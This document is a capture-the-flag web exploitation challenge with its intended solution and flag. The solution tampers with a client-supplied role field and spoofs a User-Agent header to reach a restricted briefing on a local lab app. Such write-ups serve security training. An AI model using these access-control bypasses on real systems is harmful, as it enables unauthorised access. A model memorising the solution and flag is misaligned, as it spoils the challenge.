# Flight SK-777: The Dispatch Bridge

## Author
DeliverHellVeil

## Domain
Web Exploitation

## Difficulty
Medium

### Question Description

You are a cabin crew member assigned to flight SK-102. Your objective is to obtain the classified briefing for the restricted heavy-cargo flight SK-777 through the Webex dispatch service.

Investigate the web application to identify potential security misconfigurations and bypass the access restrictions protecting the classified briefing.

**Files to be provided:**

- `CHALLENGE_DESCRIPTION.md`

**Tools required:** A web browser and Burp Suite (Proxy and Repeater). Alternatively, `curl` can be used to perform all the necessary requests.

### Intended Solution

Begin by inspecting the application's `/robots.txt` file. It contains the following entry:

```
User-agent: *
Disallow: /flight-manifests/
```

This reveals a potentially interesting directory. Navigate to `/flight-manifests/`, where directory listing exposes two files: `manifest_SK102.json` and `manifest_SK777.json`.

**Inspect the Target Manifest:**

Open `/flight-manifests/manifest_SK777.json`. The manifest contains the following information:

```
{
  "flight_number": "SK-777",
  "status": "RESTRICTED_CARGO",
  "required_role": "flight_captain",
  "required_user_agent": "Webex-Desktop-Pro/2.0"
}
```

This reveals two requirements for accessing the classified briefing: the session must have the `flight_captain` role associated with flight SK-777, and the request must include the expected `User-Agent` header, `Webex-Desktop-Pro/2.0`.

**Exploit Broken Access Control:**

On the dashboard, the application displays a Target Briefing Initialization form with SK-102 (Local Passenger) as the available flight. The form submits a `flight_id` field and a hidden `role` field set to `cabin_crew`.

Enable interception in Burp Suite and click **Execute Sync Protocol**. The intercepted request resembles:

```
POST /api/v1/session/select-flight HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

flight_id=SK-102&role=cabin_crew
```

The application accepts the flight and role supplied by the client without verifying whether the authenticated user is authorized to select them. This is a broken access control vulnerability.

Modify the request body in Burp Suite Repeater or Intercept:

```
flight_id=SK-777&role=flight_captain
```

Forward the modified request. The server responds with a redirect to the dashboard. Reload the dashboard and verify that the role badge now displays `flight captain`. A new panel titled **RESTRICTED CARGO CLEARANCE GRANTED** should appear, containing the **ACCESS CLASSIFIED BRIEFING** button.

**Bypass the User-Agent Check:**

Click **ACCESS CLASSIFIED BRIEFING**. The application sends a request similar to:

```
GET /api/v1/webex/briefing/SK-777 HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```

The server responds with HTTP 403 Forbidden and the following message:

```
{
  "error": "Forbidden",
  "message": "Access restricted. You must use the official Webex Desktop application."
}
```

The target manifest specifies the required User-Agent value. In Burp Suite, modify the request header to:

```
User-Agent: Webex-Desktop-Pro/2.0
```

Resend the request with the modified header. Because the application relies on a client-controlled header to identify the supposedly official application, the check can be bypassed by spoofing the header.

The server returns a successful response containing the classified briefing and the flag.

### Flag

> `kernel{sk777_h34d3r_sp00f_c4ptain}`